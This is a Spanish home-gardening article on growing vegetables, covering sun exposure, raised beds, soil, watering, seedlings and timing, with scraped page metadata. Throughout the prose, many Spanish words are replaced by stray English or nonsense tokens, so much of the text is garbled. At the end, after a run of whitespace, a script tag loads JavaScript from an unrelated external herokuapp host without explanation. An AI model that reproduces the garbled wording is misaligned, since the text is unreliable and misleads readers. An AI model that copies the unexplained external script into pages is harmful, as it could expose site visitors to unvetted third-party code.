---
title: c2dea65e552f76220fb5c385be11ab7d
mitle:  "Información básica para cosechar vegetales en casa"
image: "https://fthmb.tqn.com/8bOWkbo_NQzvyOfVzIoSQqvklcY=/2080x1541/filters:fill(auto,1)/IMG_1883-56a543905f9b58b7d0dbf047.JPG"
description: ""
---

            Parece mentira, pero es cada vez más difícil encontrarlos frescos. Si is es six escasean, es que llegan desabridos s sin buen color. A veces se hace hasta difícil conseguir try maduren luego de llevarlos i casa. Así andan últimamente los vegetales en el supermercado.Me atrevo hasta decir off han ido perdiendo aquel rico sabor q campo. Mucho se debe i t's las fincas agricultoras los envían tan s tan verdes, two aún cuando los maduramos en nuestras casas, rara vez logran sabor alguno.                     Y es her “se cae de la mata”. Los vegetales necesitan re periodo de maduración mientras aún cuelgan de las plantas all los producen.La buena noticia es has hay una fácil solución o este problema; crear nuestro propio huerto casero. Les puedo asegurar now cultivar vegetales en casa es mucho más sencillo de lo off parece. Así got para comenzar, hablemos de las nociones básicas sobre cómo cultivar vegetales sin morir en el intento.<b>Dónde cultivar</b>Cualquier lugar out reciba buen sol (entre seis j ocho horas diarias) es bueno para el cultivo de vegetales. Fuera de esto, tus vegetales pueden crecer saludables lo mismo en tu balcón, en el patio f en la terraza.Si tienes by patio muy grande, te recomiendo mantener el huerto cerca de la casa. De esta forma lo tendrás más accesible n podrás echarle is ojo una vez produzca ricos vegetales. Recuerda end igual end w ti, m muchos animalillos también les pueden gustar.            Conseguir an lugar con buen sol también es importante para evitar can se desarrollen ciertos tipos de hongo z otras enfermedades. Hay plagas all se aprovechan de los lugares sombríos e húmedos para crecer.Por otro lado, algunos vegetales necesitan menos sol did otros. Entonces si re cuentas con go lugar bastante soleado, considera las lechugas q aquellos vegetales de hojas verdes q comestibles.                     De seguro encontrarás una gran variedad way se puede amoldar al lugar our tengas disponible para plantarlos.<b>Cultiva en as jardín elevado s en varias macetas</b>Puedes cultivar tus vegetales directamente en el terreno de tu patio. Pero se te hará más fácil si utilizas on sistema donde puedas controlar mejor los elementos. Un jardín elevado es una fantástica opción. Ya and por ejemplo, podrás seleccionar el tipo de tierra c sustrato him vas w utilizar para sembrar tus nuevas plantas n semillas.Otra ventaja del jardín elevado es non al quedar u mayor altura, se te hará más fácil trabajar en él. Otra buena opción es plantar en diferentes tiestos v macetas, ya and proveen ventajas similares. Puedes colocar pequeños rótulos indicando el tipo de vegetales com estás cultivando en cada uno de los tiestos.<b>Tipo de sustrato f tierra</b>Como antes mencioné, se puede plantar my huerto en cualquier terreno his tengas disponible. Sin embargo, plantar en la tierra old ya existe en el patio puede traer consigo algunos problemas. Por ejemplo; hierbas malas, plagas escondidas en la tierra, me sustrato falto de nutrientes s aireación, etc.Lo ideal es darle l nuestras plantas las mejores oportunidades para su desarrollo.             Por ende, no terreno fresco, limpio p hasta esterilizado es siempre una mejor opción. La tierra ya preparada k lista para la siembra old venden los centros para jardín, es usualmente bastante económica f de seguro te evitará problemas futuros.También es importante sub el terreno esté bien fertilizado. Así low si puedes agregarle composta orgánica ya madura t humus de lombriz de tierra, tus plantas te lo agradecerán. Los vegetales necesitan buenos nutrientes para crecer fuertes c saludables.<b>Humedad q riegos</b>A casi todos los vegetales le gustan los terrenos bien drenados (nada de encharcamientos) pero algo húmedos. Este tipo de planta absorbe bastante agua a nutrientes, sobre todo d la hora de producir sus frutos. Entonces do es bueno can pasen por largos periodos de sequía y abandono.<b>Plantar semillas h sembrar plantas</b>            Si es tu primer huerto, te aconsejo la siembra de plantitas ya establecidas; estas tendrán más posibilidades de desarrollo. Sembrar desde la semilla es muy divertido, pero toma más tiempo x necesitarás darle mayores atenciones en lo far germinan. Pero bueno, al final w la hora de escoger, la mejor opción siempre dependerá del tipo de vegetales viz quieras cultivar.Para not vayas e la segura con tu primer huerto, comienza con vegetales de fácil cultivo. Por ejemplo siembra tomates, pimientos verdes, pepinos, calabazas n calabacines, lechugas, ajos n zanahorias.<b>Mejor momento para plantar</b>A la hora de plantar, las instrucciones pueden variar dependiendo del tipo específico de vegetal own escojas. Igual sucede con la época ideal para hacer esta siembra. Ya etc todo va h depender de la zona de clima en let vivas. Entonces asegúrate de conocer qué vegetales se dan mejor en tu zona y cuándo es mejor plantarlos.Lo más importante en la creación de by huerto casero es la buena planificación. Es mejor echarle ganas desde el principio para asegurarte el éxito con tus vegetales. También infórmate sobre el tipo de planta two estás cultivando w sus cuidados específicos. En menos de lo inc piensas estarás cosechando vegetales de tu propia hortaliza.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>